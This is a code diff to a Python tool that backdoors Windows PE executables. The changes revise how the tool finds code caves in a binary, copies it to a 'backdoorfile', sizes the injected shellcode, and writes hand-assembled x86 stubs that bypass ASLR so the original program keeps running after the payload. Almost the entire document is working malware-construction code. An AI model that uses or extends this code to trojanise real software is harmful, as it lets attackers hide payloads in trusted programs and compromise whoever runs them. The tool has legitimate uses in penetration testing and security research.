@@ -747,13 +747,13 @@ def resume_execution_32(ImpList):
         compliment_one, compliment_two = ones_compliment()
         #print hex(fileItems['VirtualStartingPoint'])
         if OpCode == int('e8', 16):  # Call instruction
-            print "CALL for the initial instruction"
             # Let's beat ASLR :D
             resumeExe += "\xb8"
             # include new section buffer in this in future
             aprox_loc_wo_alsr = (fileItems['VirtualStartingPoint'] +
                                  fileItems['JMPtoCodeAddress'] +
-                                 len(shellcode) + len(resumeExe)+500)
+                                 len(shellcode) + len(resumeExe) +
+                                 500 + fileItems['buffer'])
             resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
             resumeExe += struct.pack('=B', int('E8', 16))  # call
             resumeExe += "\x00"*4
@@ -772,45 +772,34 @@ def resume_execution_32(ImpList):
             resumeExe += "\xb8"  # ADD
             resumeExe += struct.pack('<I', item[3])
             resumeExe += "\x50\xc3"  # PUSH EAX,RETN
-            resumeExe += "\xe8\x00\x00\x00\x00"
-            resumeExe += "\x59"
-            resumeExe += "\xb8"
-            # Need to add buffer here.
-            aprox_loc_wo_alsr = (fileItems['VirtualStartingPoint'] +
-                                 fileItems['JMPtoCodeAddress'] +
-                                 len(shellcode) + len(resumeExe)+3)
-            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
-            resumeExe += "\x2b\xc8"
-            resumeExe += "\x81\xf9\x00\x00\x00\x0f"
-            resumeExe += "\x77\x11"
-            resumeExe += "\xb8"
+            resumeExe += "\x8b\xf0"
+            resumeExe += "\x8b\xc2"
+            resumeExe += "\xb9"
+            resumeExe += struct.pack("<I", fileItems['VirtualStartingPoint'])
+            resumeExe += "\x2b\xc1"
+            resumeExe += "\x05"
             resumeExe += struct.pack('<I', item[3])
-            resumeExe += "\x03\xc1"
             resumeExe += "\x50"
-            resumeExe += "\xb8"
-            resumeExe += struct.pack("<I", (fileItems['VirtualStartingPoint'] +
-                                            instruction+5))
-            resumeExe += "\x03\xc1"
+            resumeExe += "\x05"
+            resumeExe += struct.pack('<I', instruction)
             resumeExe += "\x50"
-            resumeExe += "\xc3"
-            resumeExe += "\xb8"
-            resumeExe += struct.pack('<I', 0xffffffff - item[3] + 1)
-            resumeExe += "\x2b\xc8"
-            resumeExe += "\x51"
-            resumeExe += "\x81\xc1"
-            resumeExe += struct.pack("<I", instruction)
-            resumeExe += "\x51"
+            resumeExe += "\x33\xc9"
+            resumeExe += "\x8b\xc6"
+            resumeExe += "\x81\xe6"
+            resumeExe += compliment_one
+            resumeExe += "\x81\xe6"
+            resumeExe += compliment_two
             resumeExe += "\xc3"
             ReturnTrackingAddress = item[3]
             return ReturnTrackingAddress, resumeExe
 
         elif OpCode in jump_codes:
-            print "JMP for initial instruction"
             #Let's beat ASLR
             resumeExe += "\xb8"
             aprox_loc_wo_alsr = (fileItems['VirtualStartingPoint'] +
                                  fileItems['JMPtoCodeAddress'] +
-                                 len(shellcode) + len(resumeExe)+500)
+                                 len(shellcode) + len(resumeExe) +
+                                 200 + fileItems['buffer'])
             resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
             resumeExe += struct.pack('=B', int('E8', 16))  # call
             resumeExe += "\x00"*4
@@ -828,30 +817,27 @@ def resume_execution_32(ImpList):
                 resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
             else:
                 resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX, CallValue
-            resumeExe += "\x50\xc3"  # Push EAX, RETN
-            resumeExe += "\xe8\x00\x00\x00\x00"
-            resumeExe += "\x59"
-            resumeExe += "\xb8"
-            # Need to add appended code cave buffer here
-            aprox_loc_wo_alsr = (fileItems['VirtualStartingPoint'] +
-                                 fileItems['JMPtoCodeAddress'] +
-                                 len(shellcode) + len(resumeExe)+3)
-            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
-            resumeExe += "\x2b\xc8"
-            resumeExe += "\x81\xf9\x00\x00\x00\x0f"
-            resumeExe += "\x77\x09"
-            resumeExe += "\xb8"
-            resumeExe += struct.pack("<I", (fileItems['VirtualStartingPoint'] +
-                                            instruction + instr_length+1))
-            resumeExe += "\x03\xc1"
+            resumeExe += "\x50\xc3"
+            resumeExe += "\x8b\xf0"
+            resumeExe += "\x8b\xc2"
+            resumeExe += "\xb9"
+            resumeExe += struct.pack('<I', fileItems['VirtualStartingPoint'])
+            resumeExe += "\x2b\xc1"
+            resumeExe += "\x05"
+            if OpCode is int('ea', 16):  # jmp far
+                resumeExe += struct.pack('<BBBBBB', ImpValue)
+            elif ImpValue > 429467295:
+                resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
+            else:
+                resumeExe += struct.pack('<I', ImpValue)
             resumeExe += "\x50"
+            resumeExe += "\x33\xc9"
+            resumeExe += "\x8b\xc6"
+            resumeExe += "\x81\xe6"
+            resumeExe += compliment_one
+            resumeExe += "\x81\xe6"
+            resumeExe += compliment_two
             resumeExe += "\xc3"
-            resumeExe += "\xb8"
-            resumeExe += struct.pack('<I', (0xffffffff -
-                                            fileItems['VirtualStartingPoint'] -
-                                            instruction - 1))
-            resumeExe += "\x2b\xc8"
-            resumeExe += "\x51\xc3"
             ReturnTrackingAddress = item[3]
             return ReturnTrackingAddress, resumeExe
 
@@ -929,6 +915,8 @@ def gather_file_info(filename, backdoorfile):
     f = open(filename, "rb")
     s = f.seek(int('3C', 16))
     fileItems['filename'] = filename
+    fileItems['buffer'] = 0
+    fileItems['JMPtoCodeAddress'] = 0
     fileItems['dis_frm_pehdrs_sectble'] = 248
     fileItems['backdoorfile'] = backdoorfile
     fileItems['pe_header_location'] = struct.unpack('<i', f.read(4))[0]
@@ -1194,7 +1182,7 @@ def find_all_caves(fileItems, shellcode_length):
 def find_cave(fileItems, shellcode_length):
     """This function finds all code caves, allowing the user
     to pick the cave for injecting shellcode."""
-    SIZE_CAVE_TO_FIND = shellcode_length + 30
+    SIZE_CAVE_TO_FIND = shellcode_length
     print "Looking for caves that will fit a shellcode "\
           "of %s length\n" % SIZE_CAVE_TO_FIND
     Tracking = 0
@@ -1322,25 +1310,30 @@ def do_thebackdoor(filename, backdoorfile, shellcode,
     if fileItems is False:
         return None
     fileItems['NewCodeCave'] = NewCodeCave
+    fileItems['shellcode'] = shellcode
     #Creating file to backdoor
     shutil.copy2(filename, fileItems['backdoorfile'])
     global f
     f = open(fileItems['backdoorfile'], "r+b")
     #reserve space for shellcode
-    if encoder == "none":
-        shellcode_length = len(shellcode) + 65
-    else:
-        shellcode_length = len(set_encoder(encoder, shellcode)) + 65
-
-    if fileItems['NewCodeCave'] is False:
-        fileItems['JMPtoCodeAddress'], fileItems['CodeCaveLOC'] = (
-            find_cave(fileItems, shellcode_length))
-    else:
-        fileItems['JMPtoCodeAddress'] = None
-
     global ImpList
     ImpList, count_bytes = pe32_entry_instr(fileItems['VirtualStartingPoint'],
                                             fileItems)
+
+    # Finding the length of the resume Exe shellcode
+    _, tempResumeExe = resume_execution_32(ImpList)
+
+    if encoder == "none":
+        shellcode_length = len(shellcode)
+    else:
+        shellcode_length = len(set_encoder(encoder, shellcode))
+    fileItems['shellcode_length'] = shellcode_length + len(tempResumeExe)
+
+    if fileItems['NewCodeCave'] is False:
+        fileItems['JMPtoCodeAddress'], fileItems['CodeCaveLOC'] = (
+            find_cave(fileItems, fileItems['shellcode_length']))
+    else:
+        fileItems['JMPtoCodeAddress'] = None
 
     #If no cave found, continue to create one.
     if fileItems['JMPtoCodeAddress'] is None:
